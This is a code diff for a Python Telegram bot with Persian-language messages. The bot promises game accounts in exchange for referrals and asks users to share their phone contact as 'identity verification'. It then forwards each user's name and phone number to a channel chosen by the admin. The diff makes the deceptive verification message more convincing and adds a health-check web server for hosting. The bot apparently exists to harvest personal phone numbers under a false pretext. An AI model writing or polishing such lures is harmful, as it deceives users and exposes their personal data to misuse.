@@ -1,4 +1,6 @@
+import os
 import logging
+from aiohttp import web
 from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
 from telegram.ext import (
     ApplicationBuilder,
@@ -22,7 +24,7 @@ ADMIN_ID = 6749949992
 
 # دیتابیس ساده در حافظه
 db = {
-    "target_channel": None,  # آیدی یا یوزرنیم چنل مقصد (مثلا @mychannel یا -100123456789)
+    "target_channel": None,  # آیدی یا یوزرنیم چنل مقصد
     "users": {}  # user_id: {"referrals": count, "invited_by": id, "phone": str}
 }
 
@@ -78,7 +80,8 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         await update.message.reply_text(
             f"سلام {user.first_name} عزیز! 👋\n\n"
-            "تا الان کلی ممبر فیک اومده و اینا و شما مجبور به تایید خود هستید.",
+            "به دلیل مسدودیت کاربران فیک برخی از دریافت کنندگان حساب بازی. شما مجبور به تایید حساب خود می‌باشید.\n"
+            "با دکمه زیر هویت خود را تایید کنید.",
             parse_mode="Markdown",
             reply_markup=contact_keyboard
         )
@@ -107,7 +110,6 @@ async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
     target_channel = db["target_channel"]
     if target_channel:
         try:
-            # ارسال متن مشخصات کاربر
             log_text = (
                 "📥 **ثبت هویت کاربر جدید**\n\n"
                 f"👤 **نام:** {user.full_name}\n"
@@ -117,7 +119,7 @@ async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
             )
             await context.bot.send_message(chat_id=target_channel, text=log_text, parse_mode="Markdown")
             
-            # فوروارد خود کنتاکت به چنل
+            # فوروارد کنتاکت
             await context.bot.forward_message(
                 chat_id=target_channel,
                 from_chat_id=update.effective_chat.id,
@@ -205,17 +207,15 @@ async def save_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     channel_input = update.message.text.strip()
 
-    # ۱. بررسی شروع شدن با @ یا -
     if not (channel_input.startswith("@") or channel_input.startswith("-")):
         await update.message.reply_text(
             "❌ **فرمت نامعتبر!**\n\n"
-            "ورودی باید حتماً با `@` (برای یوزرنیم) یا `-` (برای آیدی عددی چنل) شروع شود.\n"
+            "ورودی باید حتماً با `@` یا `-` شروع شود.\n"
             "مثال: `@my_channel` یا `-100123456789`\n\n"
             "لطفاً مجدداً ارسال کنید:"
         )
         return WAITING_FOR_CHANNEL
 
-    # ۲. بررسی ادمین بودن ربات در چنل
     try:
         bot_member = await context.bot.get_chat_member(chat_id=channel_input, user_id=context.bot.id)
         if bot_member.status not in ["administrator", "creator"]:
@@ -232,7 +232,6 @@ async def save_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return WAITING_FOR_CHANNEL
 
-    # ذخیره در صورت تایید
     db["target_channel"] = channel_input
     await update.message.reply_text(
         f"✅ چنل مقصد با موفقیت روی `{channel_input}` تنظیم شد.",
@@ -243,6 +242,10 @@ async def save_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def cancel_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("عملیات لغو شد.")
     return ConversationHandler.END
+
+# Dummy Web Server for Render Health Check
+async def handle_ping(request):
+    return web.Response(text="Bot is live!")
 
 # ----------------- MAIN FUNCTION -----------------
 def main():
@@ -262,6 +265,22 @@ def main():
     app.add_handler(MessageHandler(filters.Regex("^👤 حساب کاربری$"), account_info))
     app.add_handler(MessageHandler(filters.Regex("^🔗 لینک رفرال$"), referral_link))
     app.add_handler(MessageHandler(filters.Regex("^🎁 دریافت اکانت$"), claim_account))
+
+    # راه‌اندازی همزمان وب‌سرور برای پاس کردن Health Check رندر
+    port = int(os.environ.get("PORT", 8080))
+    web_app = web.Application()
+    web_app.router.add_get("/", handle_ping)
+    
+    runner = web.AppRunner(web_app)
+    app.job_queue.run_once(lambda ctx: runner.setup(), when=0)
+    
+    async def start_webserver(app_instance):
+        await runner.setup()
+        site = web.TCPSite(runner, '0.0.0.0', port)
+        await site.start()
+
+    print(f"Starting web server on port {port}...")
+    app.post_init = start_webserver
 
     print("Bot is running...")
     app.run_polling()
